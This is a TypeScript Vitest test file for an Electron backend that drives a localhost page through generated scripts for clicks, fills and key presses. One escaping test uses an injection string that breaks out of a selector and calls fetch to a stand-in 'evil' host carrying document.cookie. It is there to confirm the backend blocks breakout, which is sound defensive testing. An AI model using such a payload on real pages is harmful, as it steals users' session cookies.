import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

// A fake BrowserWindow just deep enough to drive the capture backend: it records
// the page scripts it is asked to run (answering from `results`, else 'ok') and
// the input events sent to it, and finishes loading as soon as loadURL is called.
const fake = vi.hoisted(() => {
  const state = { results: [] as unknown[], scripts: [] as string[], inputs: [] as unknown[] }
  class FakeWebContents {
    private handlers = new Map<string, (...args: unknown[]) => void>()
    on(event: string, fn: (...args: unknown[]) => void): this {
      this.handlers.set(event, fn)
      return this
    }
    once(event: string, fn: (...args: unknown[]) => void): this {
      return this.on(event, fn)
    }
    emit(event: string): void {
      this.handlers.get(event)?.()
    }
    setFrameRate(): void {}
    setWindowOpenHandler(): void {}
    getURL(): string {
      return 'http://localhost:3000/'
    }
    isLoading(): boolean {
      return false
    }
    async executeJavaScript(script: string): Promise<unknown> {
      state.scripts.push(script)
      return state.results.length ? state.results.shift() : 'ok'
    }
    sendInputEvent(event: unknown): void {
      state.inputs.push(event)
    }
    async capturePage(): Promise<{ toPNG: () => Buffer }> {
      return { toPNG: () => Buffer.from('PNG') }
    }
  }
  class BrowserWindow {
    webContents = new FakeWebContents()
    async loadURL(): Promise<void> {
      this.webContents.emit('did-finish-load')
    }
    getTitle(): string {
      return ''
    }
    isDestroyed(): boolean {
      return false
    }
    destroy(): void {}
  }
  const ses = { webRequest: { onBeforeRequest: () => {} }, on: () => {}, setPermissionRequestHandler: () => {} }
  return { state, BrowserWindow, session: { fromPartition: () => ses } }
})
vi.mock('electron', () => ({ BrowserWindow: fake.BrowserWindow, session: fake.session }))

const { INVALID_SELECTOR, PRESS_INPUT, stepScript, visibleScript, wireLocalhostCapture } = await import(
  './localhostCapture'
)
const { PRESS_KEYS, captureLocalhost, resetCaptureBackend } = await import('./agent/viewlocalhost')

describe('step scripts', () => {
  it('embeds selector and value as JSON literals, so they cannot break out', () => {
    const evil = `"); fetch("http://evil/"+document.cookie); ("`
    const fill = stepScript({ action: 'fill', selector: evil, value: evil })
    expect(fill).toContain(JSON.stringify(evil))
    expect(fill).not.toContain(`querySelector("${evil}")`)
    // The literal parses as a single string expression.
    expect(() => new Function(`return ${JSON.stringify(evil)}`)).not.toThrow()
  })

  it('guards native dialogs before acting and refuses file inputs', () => {
    for (const s of [
      stepScript({ action: 'click', selector: '#x' }),
      stepScript({ action: 'fill', selector: '#x', value: 'v' })
    ]) {
      expect(s).toContain('window.alert =')
      expect(s).toContain('window.confirm =')
      expect(s).toContain("'file inputs are not supported'")
    }
  })

  it('fills through the native value setter and fires input and change', () => {
    const s = stepScript({ action: 'fill', selector: '#x', value: 'v' })
    expect(s).toContain("getOwnPropertyDescriptor(Object.getPrototypeOf(el), 'value')")
    expect(s).toContain("new Event('input', { bubbles: true })")
    expect(s).toContain("new Event('change', { bubbles: true })")
  })

  it('reports an invalid selector from inside the page instead of throwing', () => {
    for (const s of [
      stepScript({ action: 'click', selector: '##' }),
      stepScript({ action: 'dblclick', selector: '##' }),
      stepScript({ action: 'press', key: 'Enter', selector: '##' })
    ]) {
      expect(s).toContain(`return ${JSON.stringify(INVALID_SELECTOR)}`)
    }
    expect(visibleScript('##')).toContain("return 'invalid'")
  })

  it('says which selector syntax works when one is invalid', () => {
    expect(INVALID_SELECTOR).toMatch(/^invalid CSS selector/)
    expect(INVALID_SELECTOR).toContain('only standard CSS')
    expect(INVALID_SELECTOR).toContain(':contains()')
    expect(INVALID_SELECTOR).toContain(':has-text()')
  })

  it('double-clicks with the full event sequence a real double click produces', () => {
    const s = stepScript({ action: 'dblclick', selector: '.todo label' })
    expect(s).toContain(JSON.stringify('.todo label'))
    expect(s).toContain('window.alert =')
    expect(s).toContain("'file inputs are not supported'")
    expect(s).toContain("for (const detail of [1, 2])")
    expect(s).toContain("['mousedown', 'mouseup', 'click']")
    expect(s).toContain("new MouseEvent('dblclick', { ...at, detail: 2 })")
  })

  it('focuses a press target and fails when it cannot take focus', () => {
    const s = stepScript({ action: 'press', key: 'Enter', selector: '#new' })
    expect(s).toContain(JSON.stringify('#new'))
    expect(s).toContain('el.focus()')
    expect(s).toContain("if (document.activeElement !== el) return 'the element cannot take keyboard focus'")
    expect(s).toContain("'file inputs are not supported'")
  })

  it('guards dialogs and refuses a focused file input for a press without a selector', () => {
    const s = stepScript({ action: 'press', key: 'Space' })
    expect(s).toContain('window.alert =')
    expect(s).not.toContain('querySelector')
    expect(s).toContain("document.activeElement.type === 'file'")
  })

  it('checks visibility, not just presence, for wait_for', () => {
    const s = visibleScript('.dashboard')
    expect(s).toContain('getBoundingClientRect')
    expect(s).toContain("s.display !== 'none'")
  })
})

describe('press key mapping', () => {
  it('maps every press key, with a char event only for Enter and Space', () => {
    expect(Object.keys(PRESS_INPUT).sort()).toEqual([...PRESS_KEYS].sort())
    const typing = Object.entries(PRESS_INPUT)
      .filter(([, v]) => v.char)
      .map(([k]) => k)
    expect(typing.sort()).toEqual(['Enter', 'Space'])
    expect(PRESS_INPUT.ArrowUp.keyCode).toBe('Up')
  })
})

describe('press steps in the Electron backend', () => {
  beforeEach(() => {
    vi.useFakeTimers()
    fake.state.results = []
    fake.state.scripts = []
    fake.state.inputs = []
    wireLocalhostCapture()
  })
  afterEach(() => {
    vi.useRealTimers()
    resetCaptureBackend()
  })

  const capture = async (
    steps: Parameters<typeof captureLocalhost>[0]['steps']
  ): ReturnType<typeof captureLocalhost> => {
    const p = captureLocalhost({ url: 'http://localhost:3000', steps })
    await vi.runAllTimersAsync()
    return p
  }

  it('focuses the target, then sends Enter as real input with its char event', async () => {
    const cap = await capture([{ action: 'press', key: 'Enter', selector: '#new' }])
    expect(cap.steps).toEqual([{ step: 'press Enter on "#new"', ok: true }])
    expect(fake.state.scripts).toHaveLength(1)
    expect(fake.state.scripts[0]).toContain('el.focus()')
    expect(fake.state.inputs).toEqual([
      { type: 'keyDown', keyCode: 'Enter' },
      { type: 'char', keyCode: 'Enter' },
      { type: 'keyUp', keyCode: 'Enter' }
    ])
  })

  it('sends a non-typing key to whatever has focus, without a char event', async () => {
    const cap = await capture([{ action: 'press', key: 'ArrowUp' }])
    expect(cap.steps).toEqual([{ step: 'press ArrowUp', ok: true }])
    expect(fake.state.inputs).toEqual([
      { type: 'keyDown', keyCode: 'Up' },
      { type: 'keyUp', keyCode: 'Up' }
    ])
  })

  it('sends no key when the target cannot take focus', async () => {
    fake.state.results = ['the element cannot take keyboard focus']
    const cap = await capture([
      { action: 'press', key: 'Enter', selector: 'div' },
      { action: 'press', key: 'Escape' }
    ])
    expect(cap.steps).toEqual([
      { step: 'press Enter on "div"', ok: false, error: 'the element cannot take keyboard focus' }
    ])
    expect(fake.state.inputs).toEqual([])
  })

  it('double-clicks through a page script, never synthesized OS input', async () => {
    const cap = await capture([{ action: 'dblclick', selector: '.todo label' }])
    expect(cap.steps).toEqual([{ step: 'double-click ".todo label"', ok: true }])
    expect(fake.state.scripts[0]).toContain("new MouseEvent('dblclick'")
    expect(fake.state.inputs).toEqual([])
  })

  it('reports the standard-CSS hint when wait_for gets an unparseable selector', async () => {
    fake.state.results = ['invalid']
    const cap = await capture([{ action: 'wait_for', selector: "button:has-text('All')", timeoutMs: 1000 }])
    expect(cap.steps).toEqual([
      { step: `wait for "button:has-text('All')"`, ok: false, error: INVALID_SELECTOR }
    ])
  })
})
